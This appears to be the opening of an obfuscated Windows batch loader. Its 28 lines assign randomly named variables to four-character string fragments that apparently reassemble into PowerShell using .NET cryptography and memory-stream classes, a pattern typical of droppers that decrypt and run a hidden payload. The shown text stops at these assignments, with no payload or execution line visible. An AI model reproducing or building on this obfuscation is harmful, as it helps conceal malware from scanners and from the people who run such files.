@echo off
set "MMOIlSjCpY=wN ="
set "dJLUXytKsn=.Cry"
set "RZJOwrXZLP=)($C"
set "LsAzaCKMqR=ode]"
set "xBZdmydXgC=rt]:"
set "OohztNHJqc=tion"
set "XRnyCxJdDq=csnl"
set "OjqaeFtjew=.Len"
set "zhpDYjNRPa=O.Me"
set "iWVgbGfzly=] -j"
set "ekYgfoySqd=736u"
set "wcrxnCaGmI=ss -"
set "LpoexMsFRk=$UAE"
set "dquxHkRaPg=New-"
set "PXVLRqxkkw=nage"
set "ecXGnDheXA=l.Pa"
set "XjdalfKNjt=ose("
set "idgILbCWbI=ptog"
set "xvQzyHISrW=uhWw"
set "ToUeUyjYoc=raph"
set "ClQELlIbzk=t Sy"
set "LwZsdlhtPK=xrrY"
set "GVDUlaUxIR=.-16"
set "bdxEWmTheS=oArr"
set "qULXyTIbfr=-4] "
set "rNjRjOvDAI=[Sys"
set "cBaTCiHDnL=$nEQ"
set "YklVpMXeTY=n ''"
set "wtwVqUBTly=brea"
